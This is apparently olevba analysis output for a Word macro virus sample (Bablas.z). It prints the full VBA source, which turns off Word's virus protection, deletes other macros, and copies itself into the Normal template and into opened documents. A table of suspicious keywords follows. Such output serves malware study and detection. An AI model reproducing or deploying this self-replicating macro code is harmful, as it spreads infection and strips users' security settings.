olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.z
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.z - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ZACHRI.bas 
in file: Virus.MSWord.Bablas.z - OLE stream: 'Macros/VBA/ZACHRI'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoExec()
    changecap
    WordBasic.disableautomacros True
    silent
    hapus_semua
End Sub

Sub hapus_semua()
    c = Documents.Count
    If c <> 0 Then
    '   'normal.ZACHRI.
       hapusdidokumen
       WordBasic.disableautomacros False
       On Error Resume Next
       If ActiveDocument.Name <> "Document1" Then
          ActiveDocument.Save
       Else
          hapusdidokumen
       End If
    End If
End Sub
Sub hapusdidokumen()
    Dim docOk As Boolean
    docOk = False
    
    For Each Obj In ActiveDocument.VBProject.VBComponents
    'MsgBox obj.Name
        If Obj.Name = "ZACHRI" Then docOk = True
        If Obj.Name <> "ZACHRI" And Obj.Name <> "ThisDocument" Then
           Application.StatusBar = "Menghapus" + Obj.Name + "Macro di " + ActiveDocument.Name + "..."
           Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    
    If Not docOk Then
       Application.StatusBar = "Mengkopi NOMAC dari Normal Template ke " + ActiveDocument.Name + "..."
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument, Name:="ZACHRI", Object:=wdOrganizerObjectProjectItems
    End If
End Sub
Sub silent()
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.VirusProtection = False
End Sub

Sub FileOpen()
    changecap
    WordBasic.disableautomacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
       cekadavirus
       hapusdidokumen
       ActiveDocument.Save
    End If
    restoreCap
    WordBasic.disableautomacros False
End Sub

Sub changecap()
    On Error Resume Next
    Application.Caption = " NOMAC is now activating..."
End Sub

Sub restoreCap()
On Error Resume Next
    
End Sub

Sub autoOpen()
    silent
    changecap
    hapusdiTemplate
    On Error Resume Next
    NormalTemplate.Save
    restoreCap
End Sub

Sub AutoClose()
    hapusdidokumen
End Sub

Sub fileClose()
    AutoClose
    ActiveDocument.Close
End Sub

Sub fileSave()
    If ActiveDocument.Saved = False Then
        hapusdidokumen
        hapusdiTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub hapusdiTemplate()
    Dim NorOk As Boolean
    NorOk = False
    
    For Each Obj In NormalTemplate.VBProject.VBComponents
    'MsgBox obj.Name
        If Obj.Name = "ZACHRI" Then NorOk = True
        If (Obj.Name <> "ZACHRI") And (Obj.Name <> "ThisDocument") Then
           Application.StatusBar = "Menghapus" + Obj.Name + "Macro di Normal Template"
           Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    
    If Not NorOk Then
       Application.StatusBar = "Mengkopi NOMAC dari " + ActiveDocument.Name + " ke Normal Template..."
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ZACHRI", Object:=wdOrganizerObjectProjectItems
       Application.DisplayRecentFiles = False
       Application.DisplayRecentFiles = True
     End If
End Sub


Sub cekadavirus()
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name <> "ZACHRI" And Obj.Name <> "ThisDocument" Then
           MsgBox "Ada Macro di Dokumen...,mungkin virus !"
        End If
    Next Obj
End Sub

Sub ViewVBCode()
'
' ViewVBCode Macro
' Shows the VB editing environment
'
    If InputBox("Masukkan password anda ", "NOMAC") = "zac" Then
        ShowVisualBasicEditor = True
    Else
        ShowVisualBasicEditor = False
    End If
End Sub


Sub ToolsMacro()
    If InputBox("Masukkan password anda ", "NOMAC") = "zac" Then
        ShowVisualBasicEditor = True
        Application.Dialogs(wdDialogToolsMacro).Show
    Else
        Beep
    End If
End Sub

Sub ViewCode()
    If InputBox("Masukkan password anda ", "NOMAC") = "zac" Then
        ShowVisualBasicEditor = True
    Else
        ShowVisualBasicEditor = False
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

